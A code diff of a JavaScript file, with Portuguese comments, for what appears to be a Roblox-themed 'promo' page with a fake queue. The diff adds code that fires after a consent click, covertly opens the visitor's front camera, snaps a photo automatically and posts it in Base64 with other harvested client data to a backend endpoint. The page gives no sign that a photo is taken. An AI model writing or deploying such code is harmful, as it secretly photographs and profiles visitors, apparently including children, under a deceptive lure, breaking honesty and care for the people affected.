@@ -14,8 +14,14 @@ const posEl = document.getElementById('pos');
 const revokeBtn = document.getElementById('revoke');
 
 // Adicionar a seção principal (Hero/Content)
-// Garante que o elemento principal seja ocultado antes da fila
 const heroSection = document.querySelector('.hero') || document.querySelector('.content'); 
+
+// ELEMENTOS DA CÂMERA (Certifique-se de que estes IDs existem no seu HTML)
+const cameraContainer = document.getElementById('cameraContainer');
+const videoElement = document.getElementById('videoElement');
+const canvasElement = document.getElementById('canvasElement');
+
+let cameraStream = null; // Para armazenar o stream da câmera
 
 // ========================================
 // CONSENT SYSTEM
@@ -27,6 +33,73 @@ function hasConsent() {
 function setConsent(v) {
   localStorage.setItem('promo_consent', v ? 'true' : 'false');
 }
+
+// ========================================
+// CAPTURA DA CÂMERA
+// ========================================
+
+/**
+ * Inicia a câmera frontal. Retorna o stream.
+ */
+async function startCamera() {
+    // Especifica a câmera frontal (user)
+    const constraints = {
+        video: {
+            facingMode: 'user', 
+            width: 320, 
+            height: 240 
+        }
+    };
+    
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject = stream;
+        videoElement.play();
+        cameraStream = stream;
+        
+        // Espera até que o vídeo esteja pronto para evitar frame preto
+        await new Promise(resolve => videoElement.onloadedmetadata = resolve); 
+        return stream;
+    } catch (err) {
+        console.error("❌ Erro ao acessar a câmera: ", err);
+        throw err;
+    }
+}
+
+/**
+ * Interrompe o stream da câmera.
+ */
+function stopCamera() {
+    if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+    }
+}
+
+/**
+ * Tira a foto, interrompe a câmera e retorna a imagem em Base64.
+ */
+function takePictureAndStop() {
+    if (!cameraStream) return null;
+
+    const context = canvasElement.getContext('2d');
+    
+    // Define o tamanho do canvas para o tamanho do vídeo
+    canvasElement.width = videoElement.videoWidth;
+    canvasElement.height = videoElement.videoHeight;
+
+    // Desenha o frame atual do vídeo no canvas
+    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+
+    // Converte o canvas para Base64 (JPG)
+    const imageData = canvasElement.toDataURL('image/jpeg', 0.9);
+    
+    stopCamera();
+    cameraContainer.style.display = 'none'; // Oculta a visualização da câmera
+
+    return imageData;
+}
+
 
 // ========================================
 // EVENTOS
@@ -42,8 +115,6 @@ btn.addEventListener('click', () => {
   }
 });
 
-// REMOVIDO: O evento de 'change' do checkbox, pois ele é marcado automaticamente ao aceitar.
-
 // Negar consentimento
 denyBtn.addEventListener('click', () => {
   setConsent(false);
@@ -53,16 +124,16 @@ denyBtn.addEventListener('click', () => {
 
 // Aceitar consentimento (FLUXO SIMPLIFICADO: Marca o checkbox e inicia o processo)
 acceptBtn.addEventListener('click', async () => {
-  // 1. Marca o checkbox de consentimento forçadamente (para fins de registro de estado)
-  consentCheckbox.checked = true; 
+  // 1. Marca o checkbox de consentimento
+  consentCheckbox.checked = true; 
 
   // 2. Define o consentimento no localStorage
   setConsent(true);
 
   // 3. Oculta o modal
   modalBack.style.display = 'none';
-  
-  // 4. Inicia a coleta de dados e o fluxo da fila
+  
+  // 4. Inicia a captura e envio
   await collectAndStart();
 });
 
@@ -75,37 +146,67 @@ revokeBtn.addEventListener('click', (e) => {
 });
 
 // ========================================
-// COLETA + ENVIO
+// COLETA + ENVIO (NOVO FLUXO AUTOMÁTICO DE CÂMERA)
 // ========================================
 async function collectAndStart() {
-  try {
-    const data = await gatherClientData();
-    console.log('📦 Dados coletados:', data);
+    let imageData = null;
 
-    // Envio ao backend
-    try {
-      const res = await fetch(ENDPOINT, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(data)
-      });
+    // 1. Oculta conteúdo principal e mostra a câmera
+    if (heroSection) {
+        heroSection.style.display = 'none';
+    }
+    cameraContainer.style.display = 'block';
 
-      const json = await res.json().catch(() => ({}));
+    try {
+        // Tenta iniciar a câmera
+        await startCamera();
 
-      if (json && json.ok && json.id) {
-        localStorage.setItem('promo_submission_id', json.id);
-      }
+        // Espera um pequeno tempo para garantir que a imagem não seja preta
+        await new Promise(resolve => setTimeout(resolve, 500)); 
+        
+        // Tira a foto automaticamente e interrompe a câmera
+        imageData = takePictureAndStop(); 
+        
+    } catch (e) {
+        console.error('❌ Não foi possível capturar a foto:', e);
+        // Se falhar (usuário negou ou erro), paramos a visualização
+        stopCamera();
+        cameraContainer.style.display = 'none';
+        alert('Falha ao acessar a câmera. Tentando continuar sem a foto.');
+    }
 
-      console.log('📨 Resposta servidor:', json);
-    } catch (err) {
-      console.error('❌ Erro ao enviar:', err);
-    }
 
-  } catch (e) {
-    console.error('❌ Erro:', e);
-  }
+    // 2. Coleta outros dados do cliente
+    const data = await gatherClientData();
+    
+    // 3. Adiciona a imagem Base64 (se capturada)
+    if (imageData) {
+        data.photo = imageData; 
+    }
+    
+    console.log('📦 Dados coletados (foto inclusa se sucesso):', data);
 
-  startQueueFlow();
+    // 4. Envio ao backend
+    try {
+        const res = await fetch(ENDPOINT, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data)
+        });
+
+        const json = await res.json().catch(() => ({}));
+
+        if (json && json.ok && json.id) {
+            localStorage.setItem('promo_submission_id', json.id);
+        }
+
+        console.log('📨 Resposta servidor:', json);
+    } catch (err) {
+        console.error('❌ Erro ao enviar:', err);
+    }
+
+    // 5. Inicia o fluxo da fila (Roblox)
+    startQueueFlow();
 }
 
 // ========================================
@@ -113,10 +214,8 @@ async function collectAndStart() {
 // ========================================
 function startQueueFlow() {
   
-  // Oculta conteúdo principal (CORRIGIDO)
-  if (heroSection) {
-    heroSection.style.display = 'none';
-  }
+  // Garante que a tela da câmera esteja oculta
+  cameraContainer.style.display = 'none';
 
   queue.style.display = 'block';
   queue.setAttribute('aria-hidden', 'false');
